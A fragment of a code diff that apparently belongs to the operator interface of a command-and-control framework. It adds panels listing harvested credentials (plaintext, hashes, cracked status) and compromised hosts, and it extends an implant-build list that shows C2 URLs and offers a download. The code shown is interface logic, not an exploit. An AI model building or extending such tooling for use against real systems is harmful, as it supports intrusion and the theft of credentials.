+  el.innerHTML = creds.map(c => `<div style="padding:5px 10px;font-size:12.5px;display:flex;gap:12px;align-items:center;border-bottom:1px solid var(--border)"><span style="flex:1;color:var(--info)">${esc(c.username)}</span><span style="flex:1;font-family:var(--mono)">${esc(c.plaintext||c.hash||'')}</span>${c.cracked?'<span style="color:var(--ok)">cracked</span>':''}<button class="btn small danger" onclick="App().DeleteCred('${esc(c.id)}').then(refreshCredsList)">Del</button></div>`).join('');
+}
+
+// ── Hosts panel ─────────────────────────────────────────────────────────────
+function openHostsPanel() {
+  openViewPanel('_hosts', 'Hosts', `<div style="overflow:auto;flex:1" id="hosts-list"><div style="padding:10px;color:var(--muted)">Loading...</div></div>`);
+  refreshHostsList();
+}
+async function refreshHostsList() {
+  const el = document.getElementById('hosts-list'); if (!el) return;
+  const hosts = await App().ListHosts().catch(() => []);
+  if (!hosts.length) { el.innerHTML = '<div style="padding:10px;color:var(--muted)">No hosts in the database.</div>'; return; }
+  el.innerHTML = hosts.map(h => `<div style="padding:5px 10px;font-size:12.5px;display:flex;gap:12px;align-items:center;border-bottom:1px solid var(--border)"><span style="flex:1;color:var(--info)">${esc(h.hostname)}</span><span style="flex:1;color:var(--muted)">${esc(h.os)}</span><span style="color:var(--muted);font-family:var(--mono)">${esc((h.uuid||'').slice(0,8))}</span><span style="color:var(--muted)">${esc(h.firstSeen)}</span><button class="btn small danger" onclick="App().DeleteHost('${esc(h.id)}').then(refreshHostsList)">Del</button></div>`).join('');
+}
+
 function openBuildsPanel() {
   openViewPanel('_builds', 'Builds', `<div style="overflow:auto;flex:1" id="builds-list"><div style="padding:10px;color:var(--muted)">Loading...</div></div>`);
   refreshBuildsList();
@@ -979,7 +1227,11 @@ async function refreshBuildsList() {
   const el = document.getElementById('builds-list'); if (!el) return;
   const builds = await App().GetBuildHistory().catch(() => []);
   if (!builds?.length) { el.innerHTML = '<div style="padding:10px;color:var(--muted)">No builds yet.</div>'; return; }
-  el.innerHTML = builds.map(b => `<div style="padding:4px 10px;font-size:12.5px;display:flex;gap:10px;align-items:center;border-bottom:1px solid var(--border)"><span style="flex:1">${esc(b.name)}</span><span style="color:var(--muted)">${esc(b.goos)}/${esc(b.goarch)}</span><span style="color:var(--muted)">${esc(b.format)}</span><span style="color:var(--muted);font-family:var(--mono);max-width:200px;overflow:hidden;text-overflow:ellipsis">${esc((b.c2Urls||[]).join(','))}</span><button class="btn small danger" onclick="if(confirm('Delete build ${esc(b.name)}?'))App().DeleteBuild('${esc(b.name)}').then(refreshBuildsList)">Del</button></div>`).join('');
+  el.innerHTML = builds.map(b => `<div style="padding:4px 10px;font-size:12.5px;display:flex;gap:10px;align-items:center;border-bottom:1px solid var(--border)"><span style="flex:1">${esc(b.name)}</span><span style="color:var(--muted)">${esc(b.goos)}/${esc(b.goarch)}</span><span style="color:var(--muted)">${esc(b.format)}</span><span style="color:var(--muted);font-family:var(--mono);max-width:180px;overflow:hidden;text-overflow:ellipsis">${esc((b.c2Urls||[]).join(','))}</span><button class="btn small" onclick="buildRegen('${esc(b.name)}')">Download</button><button class="btn small danger" onclick="if(confirm('Delete build ${esc(b.name)}?'))App().DeleteBuild('${esc(b.name)}').then(refreshBuildsList)">Del</button></div>`).join('');
+}
+async function buildRegen(name) {
+  const r = await App().RegenerateBuild(name).catch(e => ({ error: String(e) }));
+  toast(r.error ? 'err' : 'ok', r.error ? `Regenerate failed: ${r.error}` : `Saved to ${r.path}`);
 }
 
 function profilesContent() {
